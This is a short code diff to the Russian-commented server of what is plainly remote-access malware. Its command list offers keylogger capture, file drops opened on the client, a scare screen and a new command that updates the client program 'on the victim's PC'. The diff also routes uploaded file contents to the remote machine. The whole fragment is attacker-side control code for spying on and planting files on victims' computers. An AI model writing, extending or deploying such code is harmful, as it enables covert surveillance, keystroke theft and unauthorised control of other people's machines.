@@ -28,7 +28,8 @@ commands = [
     ["screamer", "показывает скример"],
     ["drop", "отправляет файл из телеграма и открывает его на клиенте"],
     ["clires", "перезапускает скрипт клиента"],
-    ["keylogger", "возвращает клавиши собранные кейлогером"]
+    ["keylogger", "возвращает клавиши собранные кейлогером"],
+    ["отправить новый файл клиента с комментарием update", "обновляет приложение клиент на пк жертвы"]
 ]
 
 # выводит список доступных команд
@@ -138,10 +139,7 @@ class Server:
     def step(self, command):
         # command = command.split(" ", 1)
         try:
-            if command[0] == "upload":
-                fileContent = self.__readFile(command[1]).decode()
-                command.append(fileContent)
-            elif command[0] == "drop":
+            if command[0] in ["upload", "drop", "update_client"]:
                 fileContent = self.__readFile(command[1]).decode()
                 command.append(fileContent)
             result = self.__executeRemotely(command)
@@ -211,7 +209,8 @@ class Server:
                 if self.connection != None:
                     json_data += self.connection.recv(1024).decode('utf-8')
                     return json.loads(json_data)
+                # действие при отсутствующем подключении к клиенту
                 else: 
-                    return None
+                    return "Клиент отключен -_-"
             except ValueError:
                 pass
